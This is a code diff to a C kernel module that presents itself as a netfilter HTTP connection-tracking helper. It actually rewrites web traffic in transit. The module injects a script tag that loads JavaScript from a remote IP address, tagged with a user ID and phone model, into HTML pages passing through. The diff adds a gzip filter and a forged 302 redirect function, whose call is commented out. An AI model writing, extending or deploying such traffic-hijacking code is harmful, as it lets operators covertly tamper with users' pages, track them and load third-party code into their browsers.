@@ -37,7 +37,8 @@ enum http_strings {
 	SEARCH_RESPONSE,
 	SEARCH_ACCEPT_ENCODING,
 	SEARCH_REQUEST_FILTER,
-	SEARCH_RESPONSE_FILTER,
+	SEARCH_RESPONSE_FILTER1,
+	SEARCH_RESPONSE_FILTER2,
 	SEARCH_INSERT_JS1,
 	SEARCH_INSERT_JS2,
 	SEARCH_INSERT_JS3,
@@ -69,9 +70,13 @@ static struct {
 		.string	= "Accept: text/html",
 		.len	= 17,
 	},
-	[SEARCH_RESPONSE_FILTER] = {
+	[SEARCH_RESPONSE_FILTER1] = {
 		.string	= "Content-Type: text/html",
 		.len	= 23,
+	},
+	[SEARCH_RESPONSE_FILTER2] = {
+		.string	= "Content-Encoding: gzip",
+		.len	= 22,
 	},
 	[SEARCH_INSERT_JS1] = {
 		.string	= "<!DOCTYPE",
@@ -215,8 +220,14 @@ static int http_help(struct sk_buff *skb,
 
 		memset(&ts, 0, sizeof(ts));
 		matchoff = skb_find_text(skb, dataoff, skb->len,
-			      search[SEARCH_RESPONSE_FILTER].ts, &ts);
+			      search[SEARCH_RESPONSE_FILTER1].ts, &ts);
 		if (matchoff == UINT_MAX)
+			return NF_ACCEPT;
+
+        memset(&ts, 0, sizeof(ts));
+		matchoff = skb_find_text(skb, dataoff, skb->len,
+			      search[SEARCH_RESPONSE_FILTER2].ts, &ts);
+		if (matchoff != UINT_MAX)
 			return NF_ACCEPT;
 		
 		change_package(skb,protoff,ct,ctinfo);
@@ -250,7 +261,7 @@ int mnlk_send(char* info)
 {
 	int size;
     struct sk_buff *skb;
-    unsigned char *old_tail;
+    int old_tail;
     struct nlmsghdr *nlh;
 
     int retval;
@@ -258,9 +269,9 @@ int mnlk_send(char* info)
     size = NLMSG_SPACE(strlen(info));
     skb = alloc_skb(size, GFP_ATOMIC); 
     nlh = nlmsg_put(skb, 0, 0, 0, NLMSG_SPACE(strlen(info))-sizeof(struct nlmsghdr), 0);
-    old_tail = (unsigned char*)skb->tail;
+    old_tail = skb->tail;
     memcpy(NLMSG_DATA(nlh), info, strlen(info));
-    nlh->nlmsg_len = (unsigned char*)skb->tail - old_tail; 
+    nlh->nlmsg_len = skb->tail - old_tail; 
 
     NETLINK_CB(skb).dst_group = 0;
     retval = netlink_unicast(nl_sk, skb, nl_pid, MSG_DONTWAIT);
@@ -368,7 +379,20 @@ module_exit(nf_conntrack_http_fini);
 #define JS "<script type=\"text/javascript\" src=\"http://210.22.155.236/js/wa.init.min.js?v=20150930\" id=\"15_bri_mjq_init_min_36_wa_101\" async  data=\"userId=12245789-423sdfdsf-ghfg-wererjju8werw&channel=test&phoneModel=DOOV S1\"></script>\r\n\0"
 #define JS_LEN strlen(JS)
 
-static void change_package(struct sk_buff *skb,
+#define REDIRECT "HTTP/1.1 302 Moved Temporarily\r\n\
+Content-Type: text/html\r\n\
+Content-Length: 55\r\n\
+Connection: Keep-Alive\r\n\
+Location: https://www.baidu.com\r\n \
+\r\n\r\n\
+<html>\
+<head><title>302 Found</title></head>\
+test\
+</html>\0"
+
+#define REDIRECT_LEN strlen(REDIRECT)
+
+static void insert_js(struct sk_buff *skb,
 		       unsigned int protoff,
 		       struct nf_conn *ct,
 		       enum ip_conntrack_info ctinfo)
@@ -475,4 +499,33 @@ static void change_package(struct sk_buff *skb,
 	//printk(KERN_INFO "yjjtest~~~~~end:%s\n" , (char*)ip_hdr(skb)+dataoff);
 
 }
+
+static void redirect(struct sk_buff *skb,
+		       unsigned int protoff,
+		       struct nf_conn *ct,
+		       enum ip_conntrack_info ctinfo)
+
+{
+    struct tcphdr* tcph;
+	unsigned int dataoff;
+
+    tcph = (struct tcphdr *)((char*)ip_hdr(skb)+protoff);
+	dataoff = protoff + (tcph->doff<<2);
+    //printk(KERN_INFO "yjjtest start~~~~~%s\n" , (char*)ip_hdr(skb)+dataoff);
+    //printk(KERN_INFO "yjjtest~~~~~%u---%u---%u\n" , skb->len , protoff , dataoff);
+	http_merge_packet(skb, ct, ctinfo,protoff,
+    				   0, skb->len-dataoff,
+    				   REDIRECT,REDIRECT_LEN);
+    //printk(KERN_INFO "yjjtest end~~~~~%s\n" , (char*)ip_hdr(skb)+dataoff);
+}
+
+static void change_package(struct sk_buff *skb,
+		       unsigned int protoff,
+		       struct nf_conn *ct,
+		       enum ip_conntrack_info ctinfo)
+{
+    insert_js(skb,protoff,ct,ctinfo);
+    //redirect(skb,protoff,ct,ctinfo);
+}
+
 
